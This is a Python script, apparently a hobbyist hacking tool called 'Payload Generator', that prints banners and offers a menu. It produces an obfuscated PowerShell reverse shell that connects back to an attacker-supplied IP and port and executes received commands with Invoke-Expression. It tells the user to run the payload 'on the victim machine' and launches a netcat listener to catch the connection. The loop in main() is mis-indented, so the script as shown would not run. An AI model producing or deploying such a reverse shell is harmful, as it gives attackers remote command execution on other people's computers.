import subprocess
from colorama import Fore, Style, init
import sys

# Initialize colorama for color handling in the terminal
init(autoreset=True)

def display_banner():
    # Tool banner and title
    print(Fore.CYAN + Style.BRIGHT + r"""
██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗      ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
    """)
    
    print(Fore.RED + Style.BRIGHT + r"""
    DEVELOPED BY:

        _____   _                                   ___                   _   _       _     _                               
       |_   _| | |_    ___   _ __    __ _   ___    / _ \     _ _    ___  (_) | |     /_\   | | __ __  __ _   _ _   ___   ___
         | |   | ' \  / _ \ | '  \  / _` | (_-<   | (_) |   | ' \  / -_) | | | |    / _ \  | | \ V / / _` | | '_| / -_) |_ /
         |_|   |_||_| \___/ |_|_|_| \__,_| /__/    \___/    |_||_| \___| |_| |_|   /_/ \_\ |_|  \_/  \__,_| |_|   \___| /__|
    """)

    # ASCII image, centered and enlarged
    print(Fore.WHITE + Style.BRIGHT + r"""
                           ⠄⠄⢀⣀⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⣤⣄⣀⠄⠄
                           ⠄⠠⣿⢿⣿⢿⣯⣿⣽⢯⣟⡿⣽⢯⣿⣽⣯⣿⣽⣟⣟⣗⠄
                           ⠄⢸⡻⠟⡚⡛⠚⠺⢟⣿⣗⣿⢽⡿⡻⠇⠓⠓⠓⠫⢷⢳⠄
                           ⠄⢼⡺⡽⣟⡿⣿⣦⡀⡈⣫⣿⡏⠁⢀⣰⣾⢿⣟⢟⢮⢱⡀
                           ⠄⣳⠑⠝⠌⠊⠃⠃⢏⢆⣺⣿⣧⢘⠎⠋⠊⠑⠨⠣⠑⣕⠂
                           ⠄⢷⣿⣯⣦⣶⣶⣶⡶⡯⣿⣿⡯⣟⣶⣶⣶⣶⣦⣧⣷⣾⠄
                           ⠄⢹⢻⢯⢟⣟⢿⢯⢿⡽⣯⣿⡯⣗⡿⡽⡯⣟⡯⣟⠯⡻⠂
                           ⠄⠢⡑⡑⠝⠜⣑⣭⠻⢝⠿⡿⡯⠫⠯⣭⣊⠪⢊⠢⢑⠰⠁
                           ⠄⠈⢹⣔⡘⢿⣿⣿⣶⠄⠁⠑⠈⠠⣵⣿⡿⡯⠂⣠⡞⡈⠄
                           ⠄⠄⠨⢻⡆⢄⣀⢩⠄⠄⠴⠕⠄⠄⠈⠉⣀⠠⢢⡟⢌⠄⠄
                           ⠄⠄⠈⠐⡝⣧⠈⡉⡙⢛⠛⠛⠛⠛⢋⠉⡀⡼⠩⡂⠁⠄⠄
                           ⠄⠄⠄⠄⠈⠪⡻⣔⣮⣷⡆⠄⢰⣿⢦⣣⢞⠅⠁⠄⠄⠄⠄
                           ⠄⠄⠄⠄⠄⠄⠈⠓⣷⣿⡅⠄⢸⣿⡗⠇⠁⠄⠄⠄⠄⠄⠄
    """)

def generate_payload(ip, port):
    # Generate the payload
    payload = (
        f"$X1=\"{ip}\";$X2={port};$X3=New-Object Net.Sockets.TCPClient($X1,$X2);"
        "$X4=$X3.GetStream();$Y1=New-Object IO.StreamReader($X4);$Y2=New-Object "
        "IO.StreamWriter($X4);$Y2.AutoFlush=$true;$Z1=New-Object Byte[] 1024;"
        "while($X3.Connected){while($X4.DataAvailable){$D1=$X4.Read($Z1,0,$Z1.Length);"
        "$J1=([Text.Encoding]::UTF8).GetString($Z1,0,$D1)}if($X3.Connected -and $J1.Length -gt 0){"
        "$D2=try{Invoke-Expression $J1 2>&1}catch{$_};$Y2.Write(\"$D2`n\");$J1=$null}};"
        "$X3.Close();$X4.Close();$Y1.Close();$Y2.Close()"
    )
    print("\nThis is the generated payload:")
    print(payload)
    print("\nCopy this code and run it on the victim machine (in PowerShell).\n")

def start_listener_in_new_terminal(port):
    print(f"Starting listener on port {port} in a new terminal...")
    subprocess.Popen(["x-terminal-emulator", "-e", f"nc -lvnp {port}"])

def main():
    display_banner()

    while True:
    print("\n[1] Generate Payload")
    print("[2] Start Listener in New Terminal")
    print("[3] Advanced Configurations (in development)")
    print("[4] Exit")

    choice = input("\nSelect an option: ")

    if choice == '1':
        ip = input("Enter the attacker's machine IP (Kali): ")
        port = input("Enter the port the attacker's machine will listen on: ")
        generate_payload(ip, port)
    elif choice == '2':
        port = input("Enter the port for the listener: ")
        start_listener_in_new_terminal(port)
    elif choice == '4':
        print("Exiting...")
        sys.exit()
    else:
        print("Invalid option, please try again.")

if __name__ == "__main__":
    main()
